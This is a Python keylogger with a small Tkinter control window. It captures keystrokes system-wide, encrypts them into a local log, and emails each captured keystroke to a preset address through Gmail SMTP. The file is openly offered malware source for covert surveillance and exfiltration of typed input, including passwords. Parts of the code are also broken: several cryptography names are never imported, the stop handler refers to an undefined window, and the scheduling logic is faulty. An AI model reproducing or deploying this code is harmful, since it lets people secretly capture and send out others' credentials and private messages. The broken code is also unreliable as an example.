# Uses Password Authentication for using the keylogger

import os
import keyboard
import base64
import subprocess
from cryptography.fernet import Fernet
from datetime import datetime
import schedule
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import tkinter as tk
from tkinter import messagebox

def generate_key():
    return Fernet.generate_key()

def encrypt_data(data, key):
    f = Fernet(key)
    return f.encrypt(data.encode())

def delete_log_file(file_path, export_old_log=True):
        if os.path.exists(file_path):
            if export_old_log:
                # Export the old log file with timestamp in the name
                current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                old_log_backup = f"old_log_{current_time}.txt"
                # Read the secret key value from the original log
                with open(file_path, 'r') as log_file:
                    lines = log_file.readlines()
                    secret_key = lines[1].strip()
                # Write the old log with the secret key in the header
                with open(old_log_backup, 'w') as old_log_file:
                    # old_log_file.write("Encrypted Keylogger Log\n")
                    old_log_file.write("Encrypted Keylogger Log\n")
                    old_log_file.write(f"{secret_key}\n")
                    old_log_file.writelines(lines[2:])
                print(f"Old log file exported as '{old_log_backup}'.")
            else:
                os.remove(file_path)

def create_new_log_file(file_path, secret_key):
    with open(file_path, 'w') as log_file:
        log_file.write("Encrypted Keylogger Log\n")
        log_file.write(f"{secret_key.decode()}\n")

def derive_key_from_password(password):
    # Convert password to bytes
    password_bytes = password.encode()

    # Generate a salt for PBKDF2
    salt = os.urandom(16)

    # Use PBKDF2 to derive a 32-byte key from the password
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,  # Adjust the number of iterations for desired security
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password_bytes))
    return key

def send_email(sender_email, sender_password, recipient_email, subject, body):
    try:
        # Set up the email server and login
        smtp_server = 'smtp.gmail.com'  # For Gmail, change it based on your email provider
        smtp_port = 587  # For Gmail
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()

        # Get the password using input() instead of getpass
        # Note that this will show the password as plain text when typed
        sender_password = input('Enter your email password: ')
        server.login(sender_email, sender_password)

        # Create the email message
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        # Send the email
        server.sendmail(sender_email, recipient_email, message.as_string())

        # Close the server connection
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

def keylogger(secret_key):
    try:
        with open('encrypted_log.txt', 'a') as log_file:
            event = keyboard.read_event()
            # Check if it's a key press event
            if event.event_type == keyboard.KEY_DOWN:
                keystroke = event.name
                encrypted_keystroke = encrypt_data(keystroke, secret_key)
                log_file.write(encrypted_keystroke.decode() + '\n')
                # Send the email with the captured keystrokes
                sender_email = 'your_email@example.com'
                recipient_email = 'recipient_email@example.com'
                subject = 'Keylogger Keystrokes'
                body = f'Hello, here are the keystrokes captured by the keylogger: {encrypted_keystroke.decode()}'
                send_email(sender_email, None, recipient_email, subject, body)
    except KeyboardInterrupt:
        print("Keylogger stopped.")
        return

def start_keylogger(password_entry):
    password = password_entry.get()
    password_bytes = password.encode()
    if len(password_bytes) < 8:
        messagebox.showerror("Invalid Password", "Password must be at least 8 characters long.")
        return
    secret_key = derive_key_from_password(password)
    file_path = 'encrypted_log.txt'
    delete_log_file(file_path)
    create_new_log_file(file_path, secret_key)

    schedule.every(5).minutes.do(keylogger, secret_key)

    while True:
        schedule.run_pending()
        time.sleep(1)
        
def stop_keylogger():
    messagebox.showinfo("Keylogger Stopped", "Keylogger has been stopped.")
    root.quit()

def main():
    root = tk.Tk()
    root.title("Keylogger")

    # Password entry field
    password_label = tk.Label(root, text="Enter password:")
    password_label.pack()
    password_entry = tk.Entry(root, show="*")
    password_entry.pack()

    # Start button
    start_button = tk.Button(root, text="Start Keylogger", command=lambda: start_keylogger(password_entry))
    start_button.pack()

    # Stop button
    stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
    stop_button.pack()

    root.mainloop()

if __name__ == "__main__":
    main()